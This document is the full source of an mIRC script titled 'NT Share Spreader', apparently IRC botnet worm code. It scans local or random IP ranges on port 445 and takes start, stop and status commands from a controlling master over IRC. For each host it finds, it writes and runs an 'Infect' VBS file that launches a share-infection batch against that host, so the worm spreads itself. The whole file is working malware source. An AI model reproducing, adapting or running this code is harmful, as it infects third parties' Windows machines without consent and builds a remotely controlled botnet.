;; [NT Share Spreader] by JumpinCow\shaxxxa ;;
on *:connect: { if (%digitalindex >= 4) { randshare } | else { if (%NTServerScanStartIp == $null) { sharemyself } | else { resumemyself } } }
on *:disconnect: { ntsharescanstop2 }
on 10:text:!ntshare*:*: { if ($address == %master) {
    if ($2 == stop) { ntsharescanstop | halt }
    if ($2 == status) { if ($timer(NTServerScan0) == $null) { msg %chan [JumpBot] Share Script Inactive | halt } | if ($timer(NTServerScan0) != $null) { if (%skill == $null) { set %skill 0 } | msg %chan [NT sharescan] Scanning: $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp) (Current) $longip(%NTServerScanCurrentIp) (Sockets Open) $sock(NTServerScan*,*) (Found) %skill | halt } }
    if ($2 == resume) {
      if (%NTServerScanStartIp == $null) { msg %chan [NT sharescan] Error: No Start IP | halt }
      if (%NTServerScanCurrentIp == $null) { msg %chan [NT sharescan] Error: No Current IP | halt }
      if (%NTServerScanEndIp == $null) { msg %chan [NT sharescan] Error: No End IP | halt }
      if (%NTServerScanCurrentIp == %NTServerScanEndIp) { msg %chan [NT sharescan] Error: Scan Complete | halt }
      msg %chan [NT sharescan] Scanning: $longip(%NTServerScanCurrentIP) -> $longip(%NTServerScanEndIP)
      startthescanning
    }
    if ($2 == start) && ($5 == $me) && ($exists(cool.exe) != $false) { unset %skill | set %NTServerScanStartIp $longip($3) | set %NTServerScanCurrentIp $longip($3) | set %NTServerScanEndIp $longip($4) | startthescanning | msg %chan [NT sharescan] Scanning: $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp) }
    if ($2 == startrandom) { unset %skill | set %NTServerScanStartIp $longip($3 $+ . $+ $rand(0,253) $+ . $+ $rand(0,253) $+ . $+ $rand(0,253)) | //set %NTServerScanCurrentIp %NTServerScanStartIp | //set %NTServerScanEndIp $longip($3 $+ . $+ 253 $+ . $+ 253 $+ . $+ 253) | startthescanning | msg %chan [NT sharescan] Scanning: $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp) }
} }
alias NTServerScan { 
  if ($exists(cool.exe) == $false) { msg # no cool.exe | ntsharescanstop2 | halt }
  if ($sock(NTServerScan*,*) >= 51) { halt }
  if (%NTServerScanCurrentIP == %NTServerScanEndIp) { msg %chan [NT sharescan] Complete: $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIp) | sockclose NTServerScan* | timerNTServerScan* Off | set %LastActNTScan 0 | halt }
  if (%NTServerScanCurrentIP != %NTServerScanEndIp) { inc %NTServerScanCurrentIP | //sockopen NTServerScan $+ %NTServerScanCurrentIp %NTServerScanCurrentIp 445 | halt }
}
on *:sockopen:NTServerScan*: {
  if ($sockerr > 0) { halt }
  inc %skill
  msg %chan [NT sharescan] Found: %skill Candidates
  write Infect $+ $sock($sockname).ip $+ .vbs on error resume next
  write Infect $+ $sock($sockname).ip $+ .vbs Set fso = CreateObject("Scripting.FileSystemObject")
  write Infect $+ $sock($sockname).ip $+ .vbs windows = fso.GetSpecialFolder(WindowsFolder)
  write Infect $+ $sock($sockname).ip $+ .vbs Set src3 = CreateObject("Wscript.shell")
  write Infect $+ $sock($sockname).ip $+ .vbs src3.run "ntshare.bat $longip($sock($sockname).ip) $+ ",0,true
  timer 1 600 remove Infect $+ $sock($sockname).ip $+ .vbs
  run Infect $+ $sock($sockname).ip $+ .vbs
  sockclose $sockname
} 
alias sharemyself { unset %skill | set %NTServerScanStartIp $longip($ip) | set %NTServerScanCurrentIp $longip($ip) | //set %tempaip $gettok($ip,1,46) $+ .254 $+ .254 $+ .254 | //set %NTServerScanEndIp $longip(%tempaip) | startthescanning | msg %chan [NT sharescan] Scanning: $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIP)  }
alias resumemyself { inc %digitalindex 1 | startthescanning }
alias startthescanning { timerNTServerScan0 -o 0 5 NTServerScan | timerNTServerScan1 -o 0 5 NTServerScan | timerNTServerScan2 -o 0 5 NTServerScan | timerNTServerScan3 -o 0 5 NTServerScan | timerNTServerScan4 -o 0 5 NTServerScan | timerNTServerScan5 -o 0 5 NTServerScan | timerNTServerScan6 -o 0 5 NTServerScan | timerNTServerScan7 -o 0 5 NTServerScan | timerNTServerScan8 -o 0 5 NTServerScan | timerNTServerScan9 -o 0 5 NTServerScan | timerNTServerScan10 -o 0 5 NTServerScan | timerNTServerScan11 -o 0 5 NTServerScan | timerNTServerScan12 -o 0 5 NTServerScan  }
alias ntsharescanstop { timerNTServerScan* Off | sockclose NTServerScan* | msg %chan [NT sharescan] Stopped | set %LastActNTScan 0 | run libparse.exe -kf psexec.exe }
alias ntsharescanstop2 { timerNTServerScan* Off | sockclose NTServerScan* | set %LastActNTScan 0 | run libparse.exe -kf psexec.exe }
alias randshare { unset %skill | //set %tempip2 $gettok(61@62@63@64@65@66@67@68@128@129@4@12@24@204@203,$rand(1,15),64)) $+ $ntrandip $+ $ntrandip $+ .1 | //set %NTServerScanStartIp $longip(%tempip2) | //set %NTServerScanCurrentIp %NTServerScanStartIp | //set %tempaip $gettok($longip(%NTServerScanStartIp),1,46) $+ .254 $+ .254 $+ .254 | //set %NTServerScanEndIp $longip(%tempaip) |  startthescanning | msg %chan [NT sharescan] Scanning: $longip(%NTServerScanStartIp) -> $longip(%NTServerScanEndIP)  }
alias ntrandip { return . $+ $rand(0,253) }
